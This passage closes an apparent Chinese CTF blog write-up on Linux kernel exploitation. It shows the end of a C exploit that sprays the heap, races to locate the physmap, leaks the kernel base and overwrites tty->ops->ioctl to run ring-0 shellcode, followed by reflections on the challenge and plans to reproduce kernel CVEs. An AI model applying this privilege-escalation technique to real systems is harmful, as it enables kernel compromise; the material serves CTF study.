	printf("slab_addr:0x%lx\n",slab_addr);
	slab_addr = slab_addr & 0xffffffffff000000;
	heap_spray();
	write_through(slab_addr);
	unsigned long *p = NULL;
	while (i++ < 0x1000)
	{
		race_write();
		p = check();
		if (p != NULL)
			goto get_root;
		close(ptmx);
	}
	ex("physmap_addr not found");
get_root:
	kernel_base = p[3] - kernel_offset;
	printf("physmap_addr:%p = 0x%lx\n", p, slab_addr);
	printf("kernel base:0x%lx\n", kernel_base);
	pts = get_ptmx_slave();
	p[3] = slab_addr + 0x300;
	p[0x300/8+12] = kernel_base + set_memory_x;	// tty->ops->ioctl = set_memory_x
	ioctl(pts,0x2333,1);
	p[0x300/8+12] = slab_addr + 0x400;		// tty->ops->ioctl = shellcode
	memset((char *)p+0x400, 0x90, 0x100);		// place your shellcode here, it will run in ring0. gl hf.
	getchar();
	ioctl(pts,0x2333,1);	
	close(fd);
	close(pts);
	close(ptmx);
	return 0;
}

```

#### 思考

这种攻击非常非常类似于去年TSCTF鸡哥出的题，同样都是堆喷，同样都是改一个值之后爆破打印确定其位置，再次膜`w1tcher`和`p4nda`师傅。

## 总结

这篇文章断断续续写了两个月大概，写kernel的exp太累，尤其是多线程/进程不好调试的题目，收获到了很多东西，todolist本来还有n1ctf的一道题，但是看了题解觉得自己的功力还不够，下一步的目标是复现两个想了很久的内核CVE。不知不觉已经正月十五了，寒假又废了，希望这俩CVE对我好一点qwq。
